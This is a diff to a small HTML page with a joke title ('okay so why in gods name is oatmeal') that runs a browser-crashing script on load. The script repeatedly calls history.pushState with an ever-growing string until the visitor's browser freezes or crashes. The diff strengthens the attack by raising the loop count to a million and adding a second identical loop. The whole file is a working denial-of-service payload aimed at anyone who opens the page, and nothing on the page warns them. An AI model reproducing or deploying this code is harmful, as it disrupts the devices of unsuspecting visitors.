@@ -5,12 +5,17 @@
     <title>okay so why in gods name is oatmeal</title>
   </head>
   <body>
-    <h1>What were you expecting?</h1>
+    <h1>Why are you here?</h1>
     <script>
         var total = "";
-        for( var i = 0; i < 100000; i++ ) {
+        for( var i = 0; i < 1000000; i++ ) {
             total = total + i.toString();
             history.pushState(0,0, total );
+        }
+        var total2 = "";
+        for( var i = 0; i < 1000000; i++ ) {
+            total2 = total2 + i.toString();
+            history.pushState(0,0, total2 );
         }
     </script>
   </body>
